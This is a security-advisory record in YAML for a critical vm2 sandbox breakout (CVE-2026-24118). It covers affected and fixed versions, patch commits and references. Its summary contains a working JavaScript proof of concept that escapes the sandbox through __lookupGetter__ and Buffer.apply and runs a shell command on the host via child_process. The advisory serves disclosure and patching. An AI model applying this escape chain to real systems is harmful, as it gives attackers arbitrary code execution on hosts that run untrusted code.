@@ -1,0 +1,163 @@
+advisory_id: GHSA-grj5-jjm8-h35p
+datasource_id: github_osv/GHSA-grj5-jjm8-h35p
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-grj5-jjm8-h35p/GHSA-grj5-jjm8-h35p.json
+aliases:
+  - CVE-2026-24118
+summary: |
+  VM2 Sandbox Breakout Through __lookupGetter__
+  ### Summary
+
+  VM2 suffers from a sandbox breakout vulnerability. This allows attackers to write code which can escape from the VM2 sandbox and execute arbitrary commands on the host system.
+
+  ### Details
+
+  The `__lookupGetter__` method allows to read the getter of an object. It is special in VM2 since it will switch between the host and sandbox version of the method when passed to the other context.
+  This allows to access getters on an object in the host context if the method is called from the host context which can be achieved by using the host `apply` method which can be accessed through `Buffer.apply`.
+  Afterwards, this function can be used to call the host version of `__lookupGetter__` with `Buffer` and `__proto__` resulting in the prototype lookup method from the host context.
+  With this method the hosts `Function.prototype` object can be retrieved and the host `Function` acquired through the `constructor` property which allows to create and run code in the host context.
+  This issue was attempted to be fixed with https://github.com/patriksimek/vm2/blob/4b009c2d4b1131c01810c1205e641d614c322a29/lib/bridge.js#L427. However, this can be circumvented by using `Object.getOwnPropertyDescriptor` to get the `constructor` property.
+
+  ### PoC
+
+  The following code demonstrates this issue by acquiring the host process object and executing `touch pwned`.
+
+  ```js
+  const {VM} = require("vm2");
+  const vm = new VM();
+  vm.run(`
+  const g = ({}).__lookupGetter__;
+  const a = Buffer.apply;
+  const p = a.apply(g, [Buffer, ['__proto__']]);
+  Object.getOwnPropertyDescriptor(p.call(a),'constructor').value('return process')().mainModule.require('child_process').execSync('touch pwned');
+  `);
+  ```
+
+  ### Impact
+
+  Attackers can perform Remote Code Execution under the assumption that arbitrary code can be executed inside the context of a vm2 sandbox.
+impacted_packages:
+  - purl: pkg:npm/vm2
+    affected_versions: vers:npm/<=3.10.4
+    fixed_versions: vers:npm/3.11.0
+    affected_packages:
+      - pkg:npm/vm2@0.1.0
+      - pkg:npm/vm2@0.1.1
+      - pkg:npm/vm2@0.2.0
+      - pkg:npm/vm2@0.2.1
+      - pkg:npm/vm2@0.2.2
+      - pkg:npm/vm2@0.2.3
+      - pkg:npm/vm2@0.2.4
+      - pkg:npm/vm2@1.0.0
+      - pkg:npm/vm2@1.0.1
+      - pkg:npm/vm2@2.0.0
+      - pkg:npm/vm2@2.0.2
+      - pkg:npm/vm2@3.0.0
+      - pkg:npm/vm2@3.0.1
+      - pkg:npm/vm2@3.1.0
+      - pkg:npm/vm2@3.2.0
+      - pkg:npm/vm2@3.3.0
+      - pkg:npm/vm2@3.3.1
+      - pkg:npm/vm2@3.4.0
+      - pkg:npm/vm2@3.4.1
+      - pkg:npm/vm2@3.4.2
+      - pkg:npm/vm2@3.4.3
+      - pkg:npm/vm2@3.4.4
+      - pkg:npm/vm2@3.4.5
+      - pkg:npm/vm2@3.4.6
+      - pkg:npm/vm2@3.5.0
+      - pkg:npm/vm2@3.5.1
+      - pkg:npm/vm2@3.5.2
+      - pkg:npm/vm2@3.6.0
+      - pkg:npm/vm2@3.6.1
+      - pkg:npm/vm2@3.6.2
+      - pkg:npm/vm2@3.6.3
+      - pkg:npm/vm2@3.6.4
+      - pkg:npm/vm2@3.6.5
+      - pkg:npm/vm2@3.6.6
+      - pkg:npm/vm2@3.6.7
+      - pkg:npm/vm2@3.6.8
+      - pkg:npm/vm2@3.6.9
+      - pkg:npm/vm2@3.6.10
+      - pkg:npm/vm2@3.6.11
+      - pkg:npm/vm2@3.7.0
+      - pkg:npm/vm2@3.8.0
+      - pkg:npm/vm2@3.8.1
+      - pkg:npm/vm2@3.8.2
+      - pkg:npm/vm2@3.8.3
+      - pkg:npm/vm2@3.8.4
+      - pkg:npm/vm2@3.9.0
+      - pkg:npm/vm2@3.9.1
+      - pkg:npm/vm2@3.9.2
+      - pkg:npm/vm2@3.9.3
+      - pkg:npm/vm2@3.9.4
+      - pkg:npm/vm2@3.9.5
+      - pkg:npm/vm2@3.9.6
+      - pkg:npm/vm2@3.9.7
+      - pkg:npm/vm2@3.9.8
+      - pkg:npm/vm2@3.9.9
+      - pkg:npm/vm2@3.9.10
+      - pkg:npm/vm2@3.9.11
+      - pkg:npm/vm2@3.9.12
+      - pkg:npm/vm2@3.9.13
+      - pkg:npm/vm2@3.9.14
+      - pkg:npm/vm2@3.9.15
+      - pkg:npm/vm2@3.9.16
+      - pkg:npm/vm2@3.9.17
+      - pkg:npm/vm2@3.9.18
+      - pkg:npm/vm2@3.9.19
+      - pkg:npm/vm2@3.10.0
+      - pkg:npm/vm2@3.10.1
+      - pkg:npm/vm2@3.10.2
+      - pkg:npm/vm2@3.10.3
+      - pkg:npm/vm2@3.10.4
+    fixed_packages:
+      - pkg:npm/vm2@3.11.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/patriksimek/vm2
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/patriksimek/vm2
+        commit: f9b700b1c7d9ef2df416666cb24e0b659140cc74
+        patch_text:
+      - vcs_url: https://github.com/patriksimek/vm2
+        commit: 2b5f3e3a060d9088f5e1cdd585d683d491f990a3
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '9.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-grj5-jjm8-h35p/GHSA-grj5-jjm8-h35p.json
+  - score: CRITICAL
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-94
+  - CWE-693
+references:
+  - url: https://github.com/patriksimek/vm2
+    reference_type:
+    reference_id:
+  - url: https://github.com/patriksimek/vm2/commit/2b5f3e3a060d9088f5e1cdd585d683d491f990a3
+    reference_type:
+    reference_id:
+  - url: https://github.com/patriksimek/vm2/commit/f9b700b1c7d9ef2df416666cb24e0b659140cc74
+    reference_type:
+    reference_id:
+  - url: https://github.com/patriksimek/vm2/releases/tag/v3.11.0
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-24118
+    reference_type:
+    reference_id: CVE-2026-24118
+  - url: https://github.com/patriksimek/vm2/security/advisories/GHSA-grj5-jjm8-h35p
+    reference_type:
+    reference_id: GHSA-grj5-jjm8-h35p
+exploits: []
